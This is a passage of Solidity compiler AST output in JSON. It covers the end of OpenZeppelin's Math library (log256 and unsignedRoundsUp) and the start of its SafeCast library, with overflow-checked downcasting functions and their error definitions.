(uint256)"}},"id":3661,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"31806:73:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"31797:82:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":3639,"id":3663,"nodeType":"Return","src":"31790:89:6"}]}]},"documentation":{"id":3630,"nodeType":"StructuredDocumentation","src":"31481:144:6","text":" @dev Return the log in base 256, following the selected rounding direction, of a positive value.\n Returns 0 if given 0."},"id":3666,"implemented":true,"kind":"function","modifiers":[],"name":"log256","nameLocation":"31639:6:6","nodeType":"FunctionDefinition","parameters":{"id":3636,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3632,"mutability":"mutable","name":"value","nameLocation":"31654:5:6","nodeType":"VariableDeclaration","scope":3666,"src":"31646:13:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3631,"name":"uint256","nodeType":"ElementaryTypeName","src":"31646:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":3635,"mutability":"mutable","name":"rounding","nameLocation":"31670:8:6","nodeType":"VariableDeclaration","scope":3666,"src":"31661:17:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"},"typeName":{"id":3634,"nodeType":"UserDefinedTypeName","pathNode":{"id":3633,"name":"Rounding","nameLocations":["31661:8:6"],"nodeType":"IdentifierPath","referencedDeclaration":2077,"src":"31661:8:6"},"referencedDeclaration":2077,"src":"31661:8:6","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}},"visibility":"internal"}],"src":"31645:34:6"},"returnParameters":{"id":3639,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3638,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3666,"src":"31703:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3637,"name":"uint256","nodeType":"ElementaryTypeName","src":"31703:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"31702:9:6"},"scope":3686,"src":"31630:266:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":3684,"nodeType":"Block","src":"32094:48:6","statements":[{"expression":{"commonType":{"typeIdentifier":"t_uint8","typeString":"uint8"},"id":3682,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint8","typeString":"uint8"},"id":3680,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":3677,"name":"rounding","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3670,"src":"32117:8:6","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}],"id":3676,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"32111:5:6","typeDescriptions":{"typeIdentifier":"t_type$_t_uint8_$","typeString":"type(uint8)"},"typeName":{"id":3675,"name":"uint8","nodeType":"ElementaryTypeName","src":"32111:5:6","typeDescriptions":{}}},"id":3678,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"32111:15:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"BinaryOperation","operator":"%","rightExpression":{"hexValue":"32","id":3679,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"32129:1:6","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"32111:19:6","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"31","id":3681,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"32134:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"32111:24:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"functionReturnParameters":3674,"id":3683,"nodeType":"Return","src":"32104:31:6"}]},"documentation":{"id":3667,"nodeType":"StructuredDocumentation","src":"31902:113:6","text":" @dev Returns whether a provided rounding mode is considered rounding up for unsigned integers."},"id":3685,"implemented":true,"kind":"function","modifiers":[],"name":"unsignedRoundsUp","nameLocation":"32029:16:6","nodeType":"FunctionDefinition","parameters":{"id":3671,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3670,"mutability":"mutable","name":"rounding","nameLocation":"32055:8:6","nodeType":"VariableDeclaration","scope":3685,"src":"32046:17:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"},"typeName":{"id":3669,"nodeType":"UserDefinedTypeName","pathNode":{"id":3668,"name":"Rounding","nameLocations":["32046:8:6"],"nodeType":"IdentifierPath","referencedDeclaration":2077,"src":"32046:8:6"},"referencedDeclaration":2077,"src":"32046:8:6","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}},"visibility":"internal"}],"src":"32045:19:6"},"returnParameters":{"id":3674,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3673,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3685,"src":"32088:4:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":3672,"name":"bool","nodeType":"ElementaryTypeName","src":"32088:4:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"32087:6:6"},"scope":3686,"src":"32020:122:6","stateMutability":"pure","virtual":false,"visibility":"internal"}],"scope":3687,"src":"281:31863:6","usedErrors":[],"usedEvents":[]}],"src":"103:32042:6"},"id":6},"@openzeppelin/contracts/utils/math/SafeCast.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/utils/math/SafeCast.sol","exportedSymbols":{"SafeCast":[5451]},"id":5452,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":3688,"literals":["solidity","^","0.8",".20"],"nodeType":"PragmaDirective","src":"192:24:7"},{"abstract":false,"baseContracts":[],"canonicalName":"SafeCast","contractDependencies":[],"contractKind":"library","documentation":{"id":3689,"nodeType":"StructuredDocumentation","src":"218:550:7","text":" @dev Wrappers over Solidity's uintXX/intXX/bool casting operators with added overflow\n checks.\n Downcasting from uint256/int256 in Solidity does not revert on overflow. This can\n easily result in undesired exploitation or bugs, since developers usually\n assume that overflows raise errors. `SafeCast` restores this intuition by\n reverting the transaction when such an operation overflows.\n Using this library instead of the unchecked operations eliminates an entire\n class of bugs, so it's recommended to use it always."},"fullyImplemented":true,"id":5451,"linearizedBaseContracts":[5451],"name":"SafeCast","nameLocation":"777:8:7","nodeType":"ContractDefinition","nodes":[{"documentation":{"id":3690,"nodeType":"StructuredDocumentation","src":"792:68:7","text":" @dev Value doesn't fit in an uint of `bits` size."},"errorSelector":"6dfcc650","id":3696,"name":"SafeCastOverflowedUintDowncast","nameLocation":"871:30:7","nodeType":"ErrorDefinition","parameters":{"id":3695,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3692,"mutability":"mutable","name":"bits","nameLocation":"908:4:7","nodeType":"VariableDeclaration","scope":3696,"src":"902:10:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"},"typeName":{"id":3691,"name":"uint8","nodeType":"ElementaryTypeName","src":"902:5:7","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"visibility":"internal"},{"constant":false,"id":3694,"mutability":"mutable","name":"value","nameLocation":"922:5:7","nodeType":"VariableDeclaration","scope":3696,"src":"914:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3693,"name":"uint256","nodeType":"ElementaryTypeName","src":"914:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"901:27:7"},"src":"865:64:7"},{"documentation":{"id":3697,"nodeType":"StructuredDocumentation","src":"935:75:7","text":" @dev An int value doesn't fit in an uint of `bits` size."},"errorSelector":"a8ce4432","id":3701,"name":"SafeCastOverflowedIntToUint","nameLocation":"1021:27:7","nodeType":"ErrorDefinition","parameters":{"id":3700,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3699,"mutability":"mutable","name":"value","nameLocation":"1056:5:7","nodeType":"VariableDeclaration","scope":3701,"src":"1049:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":3698,"name":"int256","nodeType":"ElementaryTypeName","src":"1049:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"1048:14:7"},"src":"1015:48:7"},{"documentation":{"id":3702,"nodeType":"StructuredDocumentation","src":"1069:67:7","text":" @dev Value doesn't fit in an int of `bits` size."},"errorSelector":"327269a7","id":3708,"name":"SafeCastOverflowedIntDowncast","nameLocation":"1147:29:7","nodeType":"ErrorDefinition","parameters":{"id":3707,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3704,"mutability":"mutable","name":"bits","nameLocation":"1183:4:7","nodeType":"VariableDeclaration","scope":3708,"src":"1177:10:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"},"typeName":{"id":3703,"name":"uint8","nodeType":"ElementaryTypeName","src":"1177:5:7","typeDescriptions":{"typeIdentifier":"t_uint8","typeString":"uint8"}},"visibility":"internal"},{"constant":false,"id":3706,"mutability":"mutable","name":"value","nameLocation":"1196:5:7","nodeType":"VariableDeclaration","scope":3708,"src":"1189:12:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":3705,"name":"int256","nodeType":"ElementaryTypeName","src":"1189:6:7","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"1176:26:7"},"src":"1141:62:7"},{"documentation":{"id":3709,"nodeType":"StructuredDocumentation","src":"1209:75:7","text":" @dev An uint value doesn't fit in an int of `bits` size."},"errorSelector":"24775e06","id":3713,"name":"SafeCastOverflowedUintToInt","nameLocation":"1295:27:7","nodeType":"ErrorDefinition","parameters":{"id":3712,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3711,"mutability":"mutable","name":"value","nameLocation":"1331:5:7","nodeType":"VariableDeclaration","scope":3713,"src":"1323:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3710,"name":"uint256","nodeType":"ElementaryTypeName","src":"1323:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1322:15:7"},"src":"1289:49:7"},{"body":{"id":3740,"nodeType":"Block","src":"1695:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3727,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3721,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3716,"src":"1709:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":3724,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"1722:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint248_$","typeString":"type(uint248)"},"typeName":{"id":3723,"name":"uint248","nodeType":"ElementaryTypeName","src":"1722:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint248_$","typeString":"type(uint248)"}],"id":3722,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"1717:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":3725,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1717:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint248","typeString":"type(uint248)"}},"id":3726,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"1731:3:7","memberName":"max","nodeType":"MemberAccess","src":"1717:17:7","typeDescriptions":{"typeIdentifier":"t_uint248","typeString":"uint248"}},"src":"1709:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3734,"nodeType":"IfStatement","src":"1705:105:7","trueBody":{"id":3733,"nodeType":"Block","src":"1736:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"323438","id":3729,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1788:3:7","typeDescriptions":{"typeIdentifier":"t_rational_248_by_1","typeString":"int_const 248"},"value":"248"},{"id":3730,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3716,"src":"1793:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_248_by_1","typeString":"int_const 248"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3728,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"1757:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":3731,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1757:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":3732,"nodeType":"RevertStatement","src":"1750:49:7"}]}},{"expression":{"arguments":[{"id":3737,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3716,"src":"1834:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3736,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"1826:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint248_$","typeString":"type(uint248)"},"typeName":{"id":3735,"name":"uint248","nodeType":"ElementaryTypeName","src":"1826:7:7","typeDescriptions":{}}},"id":3738,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1826:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint248","typeString":"uint248"}},"functionReturnParameters":3720,"id":3739,"nodeType":"Return","src":"1819:21:7"}]},"documentation":{"id":3714,"nodeType":"StructuredDocumentation","src":"1344:280:7","text":" @dev Returns the downcasted uint248 from uint256, reverting on\n overflow (when the input is greater than largest uint248).\n Counterpart to Solidity's `uint248` operator.\n Requirements:\n - input must fit into 248 bits"},"id":3741,"implemented":true,"kind":"function","modifiers":[],"name":"toUint248","nameLocation":"1638:9:7","nodeType":"FunctionDefinition","parameters":{"id":3717,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3716,"mutability":"mutable","name":"value","nameLocation":"1656:5:7","nodeType":"VariableDeclaration","scope":3741,"src":"1648:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3715,"name":"uint256","nodeType":"ElementaryTypeName","src":"1648:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1647:15:7"},"returnParameters":{"id":3720,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3719,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3741,"src":"1686:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint248","typeString":"uint248"},"typeName":{"id":3718,"name":"uint248","nodeType":"ElementaryTypeName","src":"1686:7:7","typeDescriptions":{"typeIdentifier":"t_uint248","typeString":"uint248"}},"visibility":"internal"}],"src":"1685:9:7"},"scope":5451,"src":"1629:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":3768,"nodeType":"Block","src":"2204:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3755,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3749,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3744,"src":"2218:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":3752,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2231:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint240_$","typeString":"type(uint240)"},"typeName":{"id":3751,"name":"uint240","nodeType":"ElementaryTypeName","src":"2231:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint240_$","typeString":"type(uint240)"}],"id":3750,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"2226:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":3753,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2226:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint240","typeString":"type(uint240)"}},"id":3754,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"2240:3:7","memberName":"max","nodeType":"MemberAccess","src":"2226:17:7","typeDescriptions":{"typeIdentifier":"t_uint240","typeString":"uint240"}},"src":"2218:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3762,"nodeType":"IfStatement","src":"2214:105:7","trueBody":{"id":3761,"nodeType":"Block","src":"2245:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"323430","id":3757,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2297:3:7","typeDescriptions":{"typeIdentifier":"t_rational_240_by_1","typeString":"int_const 240"},"value":"240"},{"id":3758,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3744,"src":"2302:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_240_by_1","typeString":"int_const 240"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3756,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"2266:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":3759,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2266:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":3760,"nodeType":"RevertStatement","src":"2259:49:7"}]}},{"expression":{"arguments":[{"id":3765,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3744,"src":"2343:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3764,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2335:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint240_$","typeString":"type(uint240)"},"typeName":{"id":3763,"name":"uint240","nodeType":"ElementaryTypeName","src":"2335:7:7","typeDescriptions":{}}},"id":3766,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2335:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint240","typeString":"uint240"}},"functionReturnParameters":3748,"id":3767,"nodeType":"Return","src":"2328:21:7"}]},"documentation":{"id":3742,"nodeType":"StructuredDocumentation","src":"1853:280:7","text":" @dev Returns the downcasted uint240 from uint256, reverting on\n overflow (when the input is greater than largest uint240).\n Counterpart to Solidity's `uint240` operator.\n Requirements:\n - input must fit into 240 bits"},"id":3769,"implemented":true,"kind":"function","modifiers":[],"name":"toUint240","nameLocation":"2147:9:7","nodeType":"FunctionDefinition","parameters":{"id":3745,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3744,"mutability":"mutable","name":"value","nameLocation":"2165:5:7","nodeType":"VariableDeclaration","scope":3769,"src":"2157:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3743,"name":"uint256","nodeType":"ElementaryTypeName","src":"2157:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2156:15:7"},"returnParameters":{"id":3748,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3747,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3769,"src":"2195:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint240","typeString":"uint240"},"typeName":{"id":3746,"name":"uint240","nodeType":"ElementaryTypeName","src":"2195:7:7","typeDescriptions":{"typeIdentifier":"t_uint240","typeString":"uint240"}},"visibility":"internal"}],"src":"2194:9:7"},"scope":5451,"src":"2138:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":3796,"nodeType":"Block","src":"2713:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3783,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3777,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3772,"src":"2727:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":3780,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2740:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint232_$","typeString":"type(uint232)"},"typeName":{"id":3779,"name":"uint232","nodeType":"ElementaryTypeName","src":"2740:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint232_$","typeString":"type(uint232)"}],"id":3778,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"2735:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":3781,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2735:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint232","typeString":"type(uint232)"}},"id":3782,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"2749:3:7","memberName":"max","nodeType":"MemberAccess","src":"2735:17:7","typeDescriptions":{"typeIdentifier":"t_uint232","typeString":"uint232"}},"src":"2727:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3790,"nodeType":"IfStatement","src":"2723:105:7","trueBody":{"id":3789,"nodeType":"Block","src":"2754:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"323332","id":3785,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2806:3:7","typeDescriptions":{"typeIdentifier":"t_rational_232_by_1","typeString":"int_const 232"},"value":"232"},{"id":3786,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3772,"src":"2811:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_232_by_1","typeString":"int_const 232"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3784,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"2775:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":3787,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2775:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":3788,"nodeType":"RevertStatement","src":"2768:49:7"}]}},{"expression":{"arguments":[{"id":3793,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3772,"src":"2852:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3792,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2844:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint232_$","typeString":"type(uint232)"},"typeName":{"id":3791,"name":"uint232","nodeType":"ElementaryTypeName","src":"2844:7:7","typeDescriptions":{}}},"id":3794,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2844:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint232","typeString":"uint232"}},"functionReturnParameters":3776,"id":3795,"nodeType":"Return","src":"2837:21:7"}]},"documentation":{"id":3770,"nodeType":"StructuredDocumentation","src":"2362:280:7","text":" @dev Returns the downcasted uint232 from uint256, reverting on\n overflow (when the input is greater than largest uint232).\n Counterpart to Solidity's `uint232` operator.\n Requirements:\n - input must fit into 232 bits"},"id":3797,"implemented":true,"kind":"function","modifiers":[],"name":"toUint232","nameLocation":"2656:9:7","nodeType":"FunctionDefinition","parameters":{"id":3773,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3772,"mutability":"mutable","name":"value","nameLocation":"2674:5:7","nodeType":"VariableDeclaration","scope":3797,"src":"2666:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3771,"name":"uint256","nodeType":"ElementaryTypeName","src":"2666:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2665:15:7"},"returnParameters":{"id":3776,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3775,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3797,"src":"2704:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint232","typeString":"uint232"},"typeName":{"id":3774,"name":"uint232","nodeType":"ElementaryTypeName","src":"2704:7:7","typeDescriptions":{"typeIdentifier":"t_uint232","typeString":"uint232"}},"visibility":"internal"}],"src":"2703:9:7"},"scope":5451,"src":"2647:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":3824,"nodeType":"Block","src":"3222:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3811,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3805,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3800,"src":"3236:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":3808,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"3249:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint224_$","typeString":"type(uint224)"},"typeName":{"id":3807,"name":"uint224","nodeType":"ElementaryTypeName","src":"3249:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint224_$","typeString":"type(uint224)"}],"id":3806,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"3244:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () 